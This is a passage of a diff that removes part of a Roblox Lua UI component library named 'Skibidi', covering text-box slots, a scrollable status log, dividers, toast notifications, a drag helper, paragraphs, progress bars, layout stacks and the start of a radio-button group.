-		end
-
-		local TB = Instance.new("TextBox", Slot)
-		TB.Size               = UDim2.new(1, -22, 1, -4)
-		TB.Position           = UDim2.new(0, 20, 0, 2)
-		TB.BackgroundTransparency = 1
-		TB.BorderSizePixel    = 0
-		TB.Font               = Theme.FontMedium
-		TB.TextSize           = 11
-		TB.TextColor3         = Theme.TextPrimary
-		TB.PlaceholderText    = ph
-		TB.PlaceholderColor3  = Theme.TextMuted
-		TB.TextXAlignment     = Enum.TextXAlignment.Left
-		TB.ClearTextOnFocus   = false
-		TB.Text               = values[i]
-
-		TB.Focused:Connect(function()
-			TweenService:Create(slotStroke, TweenFast,
-				{ Color = Theme.Accent, Thickness = 1.5, Transparency = 0 }):Play()
-			TweenService:Create(Badge, TweenFast, { TextColor3 = Theme.Accent }):Play()
-		end)
-		TB.FocusLost:Connect(function()
-			TweenService:Create(slotStroke, TweenFast,
-				{ Color = EdgeRest(), Thickness = 1, Transparency = Theme.StrokeAlpha or 0.34 }):Play()
-			TweenService:Create(Badge, TweenFast, { TextColor3 = Theme.TextMuted }):Play()
-			values[i] = TB.Text
-			if Options.OnChanged then Options.OnChanged(i, TB.Text) end
-		end)
-		TB:GetPropertyChangedSignal("Text"):Connect(function()
-			values[i] = TB.Text
-		end)
-
-		boxes[i] = TB
-	end
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "table",
-			Get  = function() return values end,
-			Set  = function(t)
-				if type(t) ~= "table" then return end
-				for i = 1, count do
-					if t[i] ~= nil then
-						values[i] = tostring(t[i])
-						if boxes[i] then boxes[i].Text = values[i] end
-						if Options.OnChanged then Options.OnChanged(i, values[i]) end
-					end
-				end
-			end,
-		}
-	end
-
-	return {
-		Frame     = Card,
-		GetValues = function() return values end,
-		SetValue  = function(i, text)
-			values[i] = text
-			if boxes[i] then boxes[i].Text = text end
-		end,
-	}
-end
-
--- ============================================================
--- CreateStatusLog
--- A scrollable text log with a "Clear" button.
---
--- Options:
---   Height    number   Scroll area height (default 200)
---   MaxLines  number   Drop the oldest entries beyond this count
---                      (optional — unlimited when omitted)
---
--- Returns:
---   { Frame, Log(msg, color?), Clear() }
---   Log's optional color tints that entry (e.g. red for errors).
--- ============================================================
-function Skibidi.CreateStatusLog(Parent, Options)
-	Options = Options or {}
-	local h = Options.Height or 200
-
-	local Wrapper = Instance.new("Frame")
-	Wrapper.Size             = UDim2.new(1, 0, 0, h + 34)
-	Wrapper.BackgroundTransparency = 1
-	Wrapper.BorderSizePixel  = 0
-	Wrapper.Parent           = Parent
-
-	local Scroll = Instance.new("ScrollingFrame", Wrapper)
-	Scroll.Size                   = UDim2.new(1, 0, 1, -34)
-	Scroll.Position               = UDim2.new(0, 0, 0, 0)
-	Scroll.BackgroundColor3       = Theme.Bg3
-	Scroll.BackgroundTransparency = 0.2
-	Scroll.BorderSizePixel        = 0
-	Scroll.ScrollBarThickness     = 3
-	Scroll.ScrollBarImageColor3   = Theme.AccentDim
-	Scroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
-	Scroll.CanvasSize             = UDim2.new(0,0,0,0)
-	Scroll.ClipsDescendants       = true
-	MakeCorner(Scroll, UDim.new(0, 5))
-	MakeEdge(Scroll, Theme.AccentDim, 1)
-	MakeGloss(Scroll, 0.10)
-	MakePadding(Scroll, 4, 4, 4, 4)
-	MakeListLayout(Scroll, Enum.FillDirection.Vertical, 2)
-
-	local ClearRow = Instance.new("Frame", Wrapper)
-	ClearRow.Size             = UDim2.new(1, 0, 0, 28)
-	ClearRow.Position         = UDim2.new(0, 0, 1, -28)
-	ClearRow.BackgroundColor3 = Theme.Bg2
-	ClearRow.BorderSizePixel  = 0
-	MakeCorner(ClearRow, UDim.new(0, 6))
-	MakeEdge(ClearRow, Theme.AccentDim, 1)
-	MakeGloss(ClearRow, 0.10)
-
-	local ClearBtn = Instance.new("TextButton", ClearRow)
-	ClearBtn.Size                   = UDim2.new(1, 0, 1, 0)
-	ClearBtn.BackgroundTransparency = 1
-	ClearBtn.Font                   = Theme.FontMedium
-	ClearBtn.TextSize               = Theme.SmallSize
-	ClearBtn.TextColor3             = Theme.TextMuted
-	ClearBtn.Text                   = "Clear Log"
-	ClearBtn.AutoButtonColor        = false
-	MakeRipple(ClearBtn, Theme.Accent, 6)
-
-	local entries  = {}
-	local maxLines = Options.MaxLines
-
-	-- Log text is arbitrary, and RichText treats < & > as markup, so the
-	-- message is escaped before the timestamp span is wrapped around it.
-	local function escapeRich(str)
-		str = string.gsub(tostring(str), "&", "&amp;")
-		str = string.gsub(str, "<", "&lt;")
-		str = string.gsub(str, ">", "&gt;")
-		return str
-	end
-
-	local stampHex = ToHex(Theme.TextMuted)
-
-	local function Log(msg, color)
-		local t = (os and os.date) and os.date("%H:%M:%S") or "??"
-		local lbl = Instance.new("TextLabel", Scroll)
-		lbl.Size                   = UDim2.new(1, -8, 0, 0)
-		lbl.AutomaticSize          = Enum.AutomaticSize.Y
-		lbl.BackgroundTransparency = 1
-		lbl.RichText               = true
-		lbl.Font                   = Enum.Font.Code
-		lbl.TextSize               = 11
-		lbl.TextColor3             = color or Theme.TextPrimary
-		lbl.TextXAlignment         = Enum.TextXAlignment.Left
-		lbl.TextWrapped            = true
-		-- Dimming the timestamp lets the eye skip straight to the message
-		-- when scanning a fast-moving log.
-		lbl.Text = string.format("<font color='#%s'>%s</font>  %s",
-			stampHex, t, escapeRich(msg))
-
-		-- New lines fade up rather than snapping in, which makes a busy
-		-- log much easier to follow.
-		lbl.TextTransparency = 1
-		TweenService:Create(lbl, TweenMed, { TextTransparency = 0 }):Play()
-		table.insert(entries, lbl)
-		if maxLines then
-			while #entries > maxLines do
-				local oldest = table.remove(entries, 1)
-				if oldest then oldest:Destroy() end
-			end
-		end
-		task.defer(function()
-			Scroll.CanvasPosition = Vector2.new(0, math.huge)
-		end)
-	end
-
-	local function Clear()
-		for _, c in ipairs(Scroll:GetChildren()) do
-			if c:IsA("TextLabel") then c:Destroy() end
-		end
-		entries = {}
-	end
-
-	ClearBtn.MouseButton1Click:Connect(Clear)
-	ClearBtn.MouseEnter:Connect(function()
-		TweenService:Create(ClearRow, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-		TweenService:Create(ClearBtn, TweenFast, { TextColor3 = Theme.Accent }):Play()
-	end)
-	ClearBtn.MouseLeave:Connect(function()
-		TweenService:Create(ClearRow, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-		TweenService:Create(ClearBtn, TweenFast, { TextColor3 = Theme.TextMuted }):Play()
-	end)
-
-	return { Frame = Wrapper, Log = Log, Clear = Clear }
-end
-
--- ============================================================
--- CreateDivider
--- A thin 1px horizontal line. Pass Options.Text for a labeled
--- divider (line with a small centered caption).
---
--- Options (all optional):
---   Text   string   Centered caption
---
--- Returns the divider Frame.
--- ============================================================
-function Skibidi.CreateDivider(Parent, Options)
-	Options = Options or {}
-
-	-- A rule that stops dead at both edges boxes the content in. Fading
-	-- the ends turns the same one pixel into a separator that belongs to
-	-- the surface it sits on.
-	local function fadeEnds(inst, mid)
-		local g = Instance.new("UIGradient", inst)
-		g.Transparency = NumberSequence.new({
-			NumberSequenceKeypoint.new(0.00, 1),
-			NumberSequenceKeypoint.new(0.20, mid),
-			NumberSequenceKeypoint.new(0.80, mid),
-			NumberSequenceKeypoint.new(1.00, 1),
-		})
-		return g
-	end
-
-	if not Options.Text or Options.Text == "" then
-		local d = Instance.new("Frame")
-		d.Size             = UDim2.new(1, 0, 0, 1)
-		d.BackgroundColor3 = Theme.Accent
-		d.BackgroundTransparency = 0.4
-		d.BorderSizePixel  = 0
-		d.Parent           = Parent
-		fadeEnds(d, 0)
-		return d
-	end
-
-	local Holder = Instance.new("Frame")
-	Holder.Size                   = UDim2.new(1, 0, 0, 14)
-	Holder.BackgroundTransparency = 1
-	Holder.BorderSizePixel        = 0
-	Holder.Parent                 = Parent
-
-	local Line = Instance.new("Frame", Holder)
-	Line.Size                   = UDim2.new(1, 0, 0, 1)
-	Line.Position               = UDim2.new(0, 0, 0.5, 0)
-	Line.BackgroundColor3       = Theme.Accent
-	Line.BackgroundTransparency = 0.45
-	Line.BorderSizePixel        = 0
-	fadeEnds(Line, 0)
-
-	-- The caption sits on top of the line and masks it with the panel's
-	-- surface colour, reading as "line — text — line".
-	local Cap = Instance.new("TextLabel", Holder)
-	Cap.AnchorPoint            = Vector2.new(0.5, 0.5)
-	Cap.Position               = UDim2.new(0.5, 0, 0.5, 0)
-	Cap.AutomaticSize          = Enum.AutomaticSize.XY
-	Cap.BackgroundColor3       = Theme.Bg1
-	Cap.BorderSizePixel        = 0
-	Cap.Font                   = Theme.FontMedium
-	Cap.TextSize               = Theme.CaptionSize
-	Cap.TextColor3             = Theme.Accent
-	Cap.Text                   = string.upper(Options.Text)
-	MakePadding(Cap, 10, 10, 1, 1)
-
-	return Holder
-end
-
--- ============================================================
--- ShowNotification
--- Bottom-right slide-in banner, auto-dismissed after 2.5s.
--- Multiple calls stack vertically.
---
--- Args:
---   Title     string
---   Text      string
---   Duration  number   Seconds before auto-dismiss (default 2.5)
--- ============================================================
-local _notifList = {}
-local _notifSg   = nil
-local NOTIF_W    = 268
-local NOTIF_H    = 48
-local NOTIF_PAD  = 8
-
-local function _ensureNotifGui()
-	if _notifSg and _notifSg.Parent then return end
-	_notifSg = Instance.new("ScreenGui")
-	_notifSg.Name           = "SkibidiNotifs"
-	_notifSg.ResetOnSpawn   = false
-	_notifSg.DisplayOrder   = 999
-	_notifSg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	_notifSg.Parent         = PlayerGui
-end
-
-local function _repositionNotifs()
-	-- Arrange from bottom up, right-aligned
-	local bottomMargin = 12
-	local totalY = 0
-	for i = #_notifList, 1, -1 do
-		local f = _notifList[i]
-		if f and f.Parent then
-			local targetY = -(bottomMargin + totalY + NOTIF_H)
-			TweenService:Create(f, TweenSoft,
-				{ Position = UDim2.new(1, -(NOTIF_W + 12), 1, targetY) }):Play()
-			totalY = totalY + NOTIF_H + NOTIF_PAD
-		end
-	end
-end
-
--- ShowNotification(Title, Text, Duration, Icon)
--- or ShowNotification({ Title=, Text=, Duration=, Icon= })
--- Icon is a lucide spec, or one of "success" | "warning" | "error" |
--- "info", which also tints the banner's rail with the matching
--- semantic colour.
-local NOTIF_KINDS = {
-	success = { "circle-check",   "Success" },
-	warning = { "triangle-alert", "Warning" },
-	error   = { "circle-x",       "Danger"  },
-	danger  = { "circle-x",       "Danger"  },
-	info    = { "info",           "Info"    },
-}
-function Skibidi.ShowNotification(Title, Text, Duration, Icon)
-	_ensureNotifGui()
-
-	if type(Title) == "table" then
-		local o = Title
-		Title, Text, Duration, Icon = o.Title, o.Text or o.Content, o.Duration, o.Icon
-	end
-	local dur = tonumber(Duration) or 2.5
-
-	local kind = type(Icon) == "string" and NOTIF_KINDS[string.lower(Icon)] or nil
-	local iconSpec  = kind and kind[1] or Icon
-	local iconColor = kind and Theme[kind[2]] or Theme.AccentSec
-
-	local F = Instance.new("Frame", _notifSg)
-	F.Size                   = UDim2.new(0, NOTIF_W, 0, NOTIF_H)
-	F.Position               = UDim2.new(1, 12, 1, 0)   -- starts off-screen right
-	F.BackgroundColor3       = Theme.Bg1
-	F.BackgroundTransparency = 0.04
-	F.BorderSizePixel        = 0
-	F.ClipsDescendants       = true
-	MakeCorner(F, UDim.new(0, Theme.CornerRadius))
-	MakeEdge(F, Theme.Accent, 1.2, 0.12)
-	MakeGloss(F, 0.14)
-	MakeGrain(F)
-	-- Banners land over arbitrary game content, so they carry their own
-	-- shadow and bloom instead of relying on the backdrop for contrast.
-	MakeGlow(F, Theme.Accent, 20, 0.84)
-
-	-- Accent rail down the left edge
-	local Bar = Instance.new("Frame", F)
-	Bar.Size             = UDim2.new(0, 3, 1, -12)
-	Bar.Position         = UDim2.new(0, 5, 0, 6)
-	Bar.BackgroundColor3 = Theme.Accent
-	Bar.BorderSizePixel  = 0
-	Bar.ZIndex           = 2
-	MakeCorner(Bar, UDim.new(1, 0))
-	MakeAccentFill(Bar, kind and iconColor or Theme.Accent)
-
-	-- Optional icon between the rail and the text
-	local textX, textW = 16, -26
-	if iconSpec then
-		local NI = MakeIcon(F, iconSpec, 18, iconColor, 2)
-		NI.AnchorPoint = Vector2.new(0, 0.5)
-		NI.Position    = UDim2.new(0, 15, 0.5, 0)
-		textX, textW   = 15 + 18 + 7, -(26 + 18 + 6)
-	end
-
-	-- Title and body on separate lines. Packing both into one truncated
-	-- RichText run meant a long title ate the message; stacked, each gets
-	-- its own budget and its own weight.
-	local TitleLbl = Instance.new("TextLabel", F)
-	TitleLbl.Size                   = UDim2.new(1, textW, 0, 16)
-	TitleLbl.Position               = UDim2.new(0, textX, 0, 8)
-	TitleLbl.BackgroundTransparency = 1
-	TitleLbl.Font                   = Theme.FontBold
-	TitleLbl.TextSize               = Theme.CaptionSize
-	TitleLbl.TextColor3             = Theme.AccentSec
-	TitleLbl.TextXAlignment         = Enum.TextXAlignment.Left
-	TitleLbl.TextTruncate           = Enum.TextTruncate.AtEnd
-	TitleLbl.ZIndex                 = 2
-	TitleLbl.Text                   = (Title or ""):upper()
-
-	local Lbl = Instance.new("TextLabel", F)
-	Lbl.Size                   = UDim2.new(1, textW, 0, 16)
-	Lbl.Position               = UDim2.new(0, textX, 0, 24)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.SmallSize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.TextTruncate           = Enum.TextTruncate.AtEnd
-	Lbl.ZIndex                 = 2
-	Lbl.Text                   = Text or ""
-
-	-- Countdown rule along the bottom: the banner shows how long it has
-	-- left instead of vanishing without warning.
-	local Timer = Instance.new("Frame", F)
-	Timer.AnchorPoint      = Vector2.new(0, 1)
-	Timer.Size             = UDim2.new(1, 0, 0, 2)
-	Timer.Position         = UDim2.new(0, 0, 1, 0)
-	Timer.BackgroundColor3 = Theme.Accent
-	Timer.BackgroundTransparency = 0.25
-	Timer.BorderSizePixel  = 0
-	Timer.ZIndex           = 3
-	TweenService:Create(Timer, TweenInfo.new(dur, Enum.EasingStyle.Linear),
-		{ Size = UDim2.new(0, 0, 0, 2) }):Play()
-
-	-- Arriving on a Back curve gives the banner a little settle at the
-	-- end of its slide, which is what makes it read as landing.
-	local Pop = Instance.new("UIScale")
-	Pop.Scale  = 0.9
-	Pop.Parent = F
-	TweenService:Create(Pop, TweenPop, { Scale = 1 }):Play()
-
-	table.insert(_notifList, F)
-	_repositionNotifs()
-
-	-- Auto-dismiss
-	task.delay(dur, function()
-		if not F.Parent then return end
-		-- Slide out to the right
-		TweenService:Create(F, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.In),
-			{ Position = UDim2.new(1, 12, F.Position.Y.Scale, F.Position.Y.Offset) }):Play()
-		TweenService:Create(Pop, TweenInfo.new(0.24, Enum.EasingStyle.Quad), { Scale = 0.92 }):Play()
-		task.delay(0.26, function()
-			if F.Parent then F:Destroy() end
-			-- Remove from list
-			for i, v in ipairs(_notifList) do
-				if v == F then table.remove(_notifList, i) break end
-			end
-			_repositionNotifs()
-		end)
-	end)
-end
-
--- ============================================================
--- MakeDraggable (standalone utility)
---
--- Options (optional third argument):
---   ClampToScreen  bool   Keep Target inside its parent container
---                         while dragging (default false)
--- ============================================================
-function Skibidi.MakeDraggable(Handle, Target, Options)
-	Options = Options or {}
-	local clampToScreen = Options.ClampToScreen == true
-	local dragging, dragStart, startPos = false, nil, nil
-	Handle.InputBegan:Connect(function(inp)
-		if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-		and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-		dragging  = true
-		dragStart = inp.Position
-		startPos  = Target.Position
-		inp.Changed:Connect(function()
-			if inp.UserInputState == Enum.UserInputState.End then dragging = false end
-		end)
-	end)
-	ConnectScoped(Target, UserInputService.InputChanged, function(inp)
-		if not dragging then return end
-		if inp.UserInputType ~= Enum.UserInputType.MouseMovement
-		and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-		local d = inp.Position - dragStart
-		local pos = UDim2.new(
-			startPos.X.Scale, startPos.X.Offset + d.X,
-			startPos.Y.Scale, startPos.Y.Offset + d.Y)
-		if clampToScreen and Target.Parent then
-			local ok, screen = pcall(function() return Target.Parent.AbsoluteSize end)
-			if ok and screen and screen.X > 0 and screen.Y > 0 then
-				local tw, th = Target.AbsoluteSize.X, Target.AbsoluteSize.Y
-				local absX = math.clamp(pos.X.Scale * screen.X + pos.X.Offset, 0, math.max(0, screen.X - tw))
-				local absY = math.clamp(pos.Y.Scale * screen.Y + pos.Y.Offset, 0, math.max(0, screen.Y - th))
-				pos = UDim2.new(
-					pos.X.Scale, absX - pos.X.Scale * screen.X,
-					pos.Y.Scale, absY - pos.Y.Scale * screen.Y)
-			end
-		end
-		Target.Position = pos
-	end)
-end
-
--- ============================================================
--- CreateParagraph
--- A static text block: optional bold title + wrapped body text.
---
--- Options:
---   Title     string
---   Icon      string   Lucide icon before the title (optional)
---   Content   string   (also accepts Options.Text)
---
--- Returns: { Frame, SetTitle(text), SetText(text), SetIcon(spec) }
--- ============================================================
-function Skibidi.CreateParagraph(Parent, Options)
-	Options = Options or {}
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, 0)
-	Card.AutomaticSize     = Enum.AutomaticSize.Y
-	Card.BackgroundColor3  = Theme.Bg2
-	Card.BorderSizePixel   = 0
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-	MakePadding(Card, 12, 12, 10, 10)
-	MakeListLayout(Card, Enum.FillDirection.Vertical, 4)
-
-	local TitleLbl, ParaIcon
-	if Options.Title and Options.Title ~= "" then
-		TitleLbl = Instance.new("TextLabel", Card)
-		TitleLbl.Size                   = UDim2.new(1, 0, 0, 0)
-		TitleLbl.AutomaticSize          = Enum.AutomaticSize.Y
-		TitleLbl.BackgroundTransparency = 1
-		TitleLbl.Font                   = Theme.FontMedium
-		TitleLbl.TextSize               = Theme.BodySize
-		TitleLbl.TextColor3             = Theme.Accent
-		TitleLbl.TextXAlignment         = Enum.TextXAlignment.Left
-		TitleLbl.TextWrapped            = true
-		TitleLbl.LayoutOrder            = 0
-		TitleLbl.Text                   = Options.Title
-		if Options.Icon then
-			ParaIcon = PadIcon(TitleLbl, Options.Icon, 14, Theme.Accent)
-		end
-
-		-- Layout-safe because Card stacks vertically: the rule is simply
-		-- the next item in the list, not an overlay.
-		local Rule = Instance.new("Frame", Card)
-		Rule.Size                   = UDim2.new(1, 0, 0, 1)
-		Rule.BackgroundColor3       = Theme.Accent
-		Rule.BackgroundTransparency = 0.55
-		Rule.BorderSizePixel        = 0
-		Rule.LayoutOrder            = 1
-		local rg = Instance.new("UIGradient", Rule)
-		rg.Transparency = NumberSequence.new({
-			NumberSequenceKeypoint.new(0.00, 0),
-			NumberSequenceKeypoint.new(0.55, 0.45),
-			NumberSequenceKeypoint.new(1.00, 1),
-		})
-	end
-
-	local Body = Instance.new("TextLabel", Card)
-	Body.Size                   = UDim2.new(1, 0, 0, 0)
-	Body.AutomaticSize          = Enum.AutomaticSize.Y
-	Body.BackgroundTransparency = 1
-	Body.Font                   = Theme.FontRegular
-	Body.TextSize               = Theme.SmallSize
-	Body.TextColor3             = Theme.TextMuted
-	Body.TextXAlignment         = Enum.TextXAlignment.Left
-	Body.TextYAlignment         = Enum.TextYAlignment.Top
-	Body.TextWrapped            = true
-	Body.LayoutOrder            = 2
-	Body.Text                   = Options.Content or Options.Text or ""
-
-	return {
-		Frame    = Card,
-		SetTitle = function(t) if TitleLbl then TitleLbl.Text = t end end,
-		SetText  = function(t) Body.Text = t end,
-		SetIcon  = function(spec)
-			if ParaIcon then
-				SetIconImage(ParaIcon, spec)
-			elseif TitleLbl and spec and spec ~= "" then
-				ParaIcon = PadIcon(TitleLbl, spec, 14, Theme.Accent)
-			end
-		end,
-	}
-end
-
--- ============================================================
--- CreateProgressBar
--- A labeled row with a filled progress track.
---
--- Options:
---   Label     string
---   Min       number   (default 0)
---   Max       number   (default 100)
---   Default   number   (default Min)
---   Format    string   string.format pattern for the percent text
---                      (default "%d%%", receives 0-100)
---   Icon      string   Lucide icon before the label (optional)
---
--- Returns: { Frame, Update(value, instant), GetValue() }
--- ============================================================
-function Skibidi.CreateProgressBar(Parent, Options)
-	Options = Options or {}
-	local Min = Options.Min or 0
-	local Max = Options.Max or 100
-	local cur = math.clamp(Options.Default or Min, Min, Max)
-
-	local Row = Instance.new("Frame")
-	Row.Size             = UDim2.new(1, 0, 0, 40)
-	Row.BackgroundColor3 = Theme.Bg2
-	Row.BorderSizePixel  = 0
-	Row.Parent           = Parent
-	MakeCorner(Row, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Row, Theme.AccentDim, 1)
-	MakeGloss(Row, 0.10)
-	MakePadding(Row, 12, 12, 6, 8)
-
-	local TopRow = Instance.new("Frame", Row)
-	TopRow.Size                   = UDim2.new(1, 0, 0, 16)
-	TopRow.BackgroundTransparency = 1
-
-	local Lbl = Instance.new("TextLabel", TopRow)
-	Lbl.Size                   = UDim2.new(1, -46, 1, 0)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.SmallSize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.TextTruncate           = Enum.TextTruncate.AtEnd
-	Lbl.Text                   = Options.Label or ""
-	if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-
-	local PctLbl = Instance.new("TextLabel", TopRow)
-	PctLbl.Size                   = UDim2.new(0, 46, 1, 0)
-	PctLbl.Position               = UDim2.new(1, -46, 0, 0)
-	PctLbl.BackgroundTransparency = 1
-	PctLbl.Font                   = Theme.FontMedium
-	PctLbl.TextSize               = Theme.SmallSize
-	PctLbl.TextColor3             = Theme.AccentSec
-	PctLbl.TextXAlignment         = Enum.TextXAlignment.Right
-
-	local Track = Instance.new("Frame", Row)
-	Track.Position         = UDim2.new(0, 0, 0, 22)
-	Track.Size             = UDim2.new(1, 0, 0, 7)
-	Track.BackgroundColor3 = Theme.ToggleOff
-	Track.BorderSizePixel  = 0
-	MakeCorner(Track, UDim.new(1, 0))
-	do
-		local g = Instance.new("UIGradient", Track)
-		g.Rotation = 90
-		g.Color = ColorSequence.new(Color3.new(0.72, 0.72, 0.72), Color3.new(1, 1, 1))
-	end
-
-	local Fill = Instance.new("Frame", Track)
-	Fill.Size             = UDim2.new(0, 0, 1, 0)
-	Fill.BackgroundColor3 = Theme.Accent
-	Fill.BorderSizePixel  = 0
-	Fill.ClipsDescendants = true
-	MakeCorner(Fill, UDim.new(1, 0))
-	-- The travelling highlight is the difference between a bar that has
-	-- stopped and a bar that is still working.
-	MakeAccentFill(Fill, Theme.Accent, true)
-
-	local function Update(val, instant)
-		val = math.clamp(val, Min, Max)
-		cur = val
-		local pct = (Max > Min) and (val - Min) / (Max - Min) or 0
-		local fmt = Options.Format or "%d%%"
-		PctLbl.Text = string.format(fmt, math.floor(pct * 100 + 0.5))
-		if instant then
-			Fill.Size = UDim2.new(pct, 0, 1, 0)
-		else
-			TweenService:Create(Fill, TweenMed, { Size = UDim2.new(pct, 0, 1, 0) }):Play()
-		end
-	end
-	Update(cur, true)
-	PlayEntrance(Row)
-
-	return {
-		Frame    = Row,
-		Update   = Update,
-		GetValue = function() return cur end,
-		SetLabel = function(t) Lbl.Text = t or "" end,
-	}
-end
-
--- ============================================================
--- CreateSpace
--- An invisible spacer, useful inside sections/stacks to add
--- breathing room without a divider or a component.
---
--- Options:
---   Height   number   (default 8) — used when the parent stacks vertically
---   Width    number   (default 8) — used when the parent stacks horizontally
--- ============================================================
-function Skibidi.CreateSpace(Parent, Options)
-	Options = Options or {}
-	local Spacer = Instance.new("Frame")
-	Spacer.Size                   = UDim2.new(0, Options.Width or 0, 0, Options.Height or 8)
-	if not Options.Width then
-		Spacer.Size = UDim2.new(1, 0, 0, Options.Height or 8)
-	end
-	Spacer.BackgroundTransparency = 1
-	Spacer.BorderSizePixel        = 0
-	Spacer.Parent                 = Parent
-	return { Frame = Spacer }
-end
-
--- ============================================================
--- CreateHStack / CreateVStack
--- Generic layout containers for arranging components in a row
--- or column, mirroring the section/content building blocks used
--- throughout the rest of the library.
---
--- Options:
---   Spacing               number   Gap between children (default 6)
---   HorizontalAlignment    Enum.HorizontalAlignment
---   VerticalAlignment      Enum.VerticalAlignment
---   Height                 number   (HStack only — fixes the row height;
---                                    default auto-fits the tallest child)
---
--- Returns: { Frame }
--- ============================================================
-function Skibidi.CreateHStack(Parent, Options)
-	Options = Options or {}
-	local gap = Options.Spacing or 6
-
-	local Stack = Instance.new("Frame")
-	Stack.BackgroundTransparency = 1
-	Stack.BorderSizePixel        = 0
-	Stack.Parent                 = Parent
-	if Options.Height then
-		Stack.Size = UDim2.new(1, 0, 0, Options.Height)
-	else
-		Stack.Size          = UDim2.new(1, 0, 0, 0)
-		Stack.AutomaticSize = Enum.AutomaticSize.Y
-	end
-	MakeListLayout(Stack, Enum.FillDirection.Horizontal, gap,
-		Options.HorizontalAlignment or Enum.HorizontalAlignment.Left,
-		Options.VerticalAlignment or Enum.VerticalAlignment.Center)
-
-	-- Every other CreateXxx helper builds a full-width "row" component
-	-- (Size.X.Scale = 1) since it's normally the only thing in its row.
-	-- Dropped into a horizontal stack that would make each child fight
-	-- for the whole width, so give every direct child an equal share
-	-- instead — the same fixed, non-text-dependent split used for tabs.
-	local function relayout()
-		local kids = {}
-		for _, c in ipairs(Stack:GetChildren()) do
-			if c:IsA("GuiObject") then table.insert(kids, c) end
-		end
-		local n = #kids
-		if n == 0 then return end
-		local shareOffset = -(gap * (n - 1)) / n
-		for _, c in ipairs(kids) do
-			c.Size = UDim2.new(1 / n, shareOffset, c.Size.Y.Scale, c.Size.Y.Offset)
-		end
-	end
-	Stack.ChildAdded:Connect(relayout)
-	Stack.ChildRemoved:Connect(relayout)
-
-	return { Frame = Stack }
-end
-
-function Skibidi.CreateVStack(Parent, Options)
-	Options = Options or {}
-	local Stack = Instance.new("Frame")
-	Stack.Size                   = UDim2.new(1, 0, 0, 0)
-	Stack.AutomaticSize          = Enum.AutomaticSize.Y
-	Stack.BackgroundTransparency = 1
-	Stack.BorderSizePixel        = 0
-	Stack.Parent                 = Parent
-	MakeListLayout(Stack, Enum.FillDirection.Vertical, Options.Spacing or 6,
-		Options.HorizontalAlignment or Enum.HorizontalAlignment.Left,
-		Options.VerticalAlignment or Enum.VerticalAlignment.Top)
-	return { Frame = Stack }
-end
-
--- ============================================================
--- CreateGroup
--- A labeled set of mutually-exclusive radio-style options.
---
--- Options:
---   Label      string
---   Options    table    Array of option strings
---   Default    number   Initially selected index (default 1)
---   OnChanged  function(index, value)
---   Tooltip    string   Hover tooltip (optional)
---   Flag       string   Config key for SaveConfig/LoadConfig
---
--- Returns: { Frame, SetValue(index), GetValue() }
--- ============================================================
-function Skibidi.CreateGroup(Parent, Options)
-	Options = Options or {}
-	local items   = Options.Options or {}
-	local current = Options.Default or 1
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, 0)
-	Card.AutomaticSize     = Enum.AutomaticSize.Y
-	Card.BackgroundColor3  = Theme.Bg2
-	Card.BorderSizePixel   = 0
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-	MakePadding(Card, 8, 8, 8, 8)
-	MakeListLayout(Card, Enum.FillDirection.Vertical, 2)
-
-	if Options.Label and Options.Label ~= "" then
-		local Lbl = Instance.new("TextLabel", Card)
-		Lbl.Size                   = UDim2.new(1, 0, 0, 20)
-		Lbl.BackgroundTransparency = 1
-		Lbl.Font                   = Theme.FontMedium
-		Lbl.TextSize               = Theme.SmallSize
-		Lbl.TextColor3             = Theme.Accent
-		Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-		Lbl.LayoutOrder            = 0
-		Lbl.Text                   = Options.Label
-	end
-
-	local rows = {}
-	-- The selected wash is mixed from the palette rather than hard-coded,
-	-- so it lands correctly on every preset instead of only the gold one.
-	local SEL_BG = Mix(Theme.Bg2, Theme.Accent, 0.16)
-
-	local function refresh()
-		for i, row in ipairs(rows) do
-			local on = (i == current)
-			TweenService:Create(row.Dot, TweenSpring, {
-				BackgroundColor3 = on and Theme.Accent or Theme.Bg3,
-				Size             = on and UDim2.new(0, 8, 0, 8) or UDim2.new(0, 5, 0, 5),
-			}):Play()
-			TweenService:Create(row.Ring, TweenFast, {
-				Color     = on and Theme.Accent or Theme.AccentDim,
-				Thickness = on and 2 or 1.5,
-			}):Play()
-			TweenService:Create(row.Lbl, TweenFast,
-				{ TextColor3 = on and Theme.ActiveTabText or Theme.TextPrimary }):Play()
-			row.Lbl.Font = on and Theme.FontMedium or Theme.FontRegular
-			-- Selected rows hold a standing wash; hover only borrows the
-			-- row while the pointer is on it.
-			if on then row.Row.BackgroundTransparency = 0 end
-			TweenService:Create(row.Row, TweenFast, {
-				BackgroundColor3       = on and SEL_BG or Theme.Bg2,
-				BackgroundTransparency = on and 0 or 1,
-			}):Play()
-			TweenService:Create(row.Tick, TweenSpring,
-				{ Size = UDim2.new(0, 2, 0, on and 14 or 0) }):Play()
-		end
-	end
-
-	for i, text in ipairs(items) do
